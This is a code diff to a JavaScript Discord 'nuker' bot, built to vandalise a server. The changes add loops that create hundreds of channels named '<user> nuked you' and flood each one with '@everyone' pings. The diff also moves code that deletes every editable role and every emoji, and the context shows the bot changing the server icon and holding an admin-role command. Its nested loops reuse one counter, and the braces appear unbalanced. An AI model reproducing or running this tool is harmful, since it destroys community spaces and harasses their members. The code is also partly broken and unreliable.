@@ -273,17 +273,29 @@ client.on("message", async message => {
                     message.guild.setIcon('https://images-ext-1.discordapp.net/external/LwTQjXzufFNHNuhQw6xWKko-CEPxYFyMQzBYQQLz_gU/%3Fwidth%3D323%26height%3D406/https/media.discordapp.net/attachments/781947622269255690/829957982926274560/rip.png?width=323&height=405') // changes server pfp
                 ));
 
-                // Roles
-                message.guild.roles.cache.forEach((role) => {
-                    if (!role.editable) {
-                        return;
-                    } else {
-                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
-                    }
-                })
 
-                // Emoji
-                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))
+               //Channel Creation
+							      for (var i = 0; i < 5; i++) {
+                            let channels = message.guild.channels.create("CITIZEN Daddy") }
+
+                  for (var i = 0; i < 250; i++) {
+                        message.guild.channels.create(message.author.username + " nuked you")
+
+                        for (var i = 0; i < 250; i++) {
+                            let channels = message.guild.channels.create(message.author.username + " nuked you")
+
+                            channels.then(
+                                function (channel, index) {
+                                    for (var i = 0; i < 250; i++) {
+                                        channel.send('@everyone ' + argresult)
+                                        console.log(blueBright(`CHANNEL PINGED!`));
+                                        // other per-channnel logic
+                                    }
+                                }
+                            );
+                        }
+
+                    }
 
                 // Massing Channels
                 let args = message.content.split(" ").slice(1);
@@ -294,7 +306,7 @@ client.on("message", async message => {
                 } else {
 
                     for (var i = 0; i < 250; i++) {
-                        let channels = message.guild.channels.create(argresult)
+                        let channels = message.guild.channels.create("@everyone "+argresult)
 
                         channels.then(
                             function (channel, index) {
@@ -307,18 +319,21 @@ client.on("message", async message => {
                         )
                     }
                 }
-                setInterval(function () {
-                    var i = 0; i < 250;
-                    message.guild.roles.create({
-                        data: {
-                            name: `${argresult}`,
-                            position: i++,
-                            color: "RANDOM"
-                        }
-                    }).then(console.log(yellow("ROLE BEING MASSED")))
-                }, 100) // 0.1 second
-            }
-        }
+
+                // Roles
+                message.guild.roles.cache.forEach((role) => {
+                    if (!role.editable) {
+                        return;
+                    } else {
+                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
+                    }
+                  })
+
+                // Emoji
+                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))
+
+
+				}
 
         ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
     } else if (disableEveryone === true)
@@ -620,6 +635,8 @@ client.on("message", async message => {
         }
       }
 		}
+
+  }
 			//Admin Perm
           if (message.content.startsWith(prefix + 'papa'))
 		  {    role = await message.guild.roles.create ({
@@ -667,7 +684,7 @@ client.on("message", async message => {
 
 
 
-	}
+
 })
 
 client.login(token);
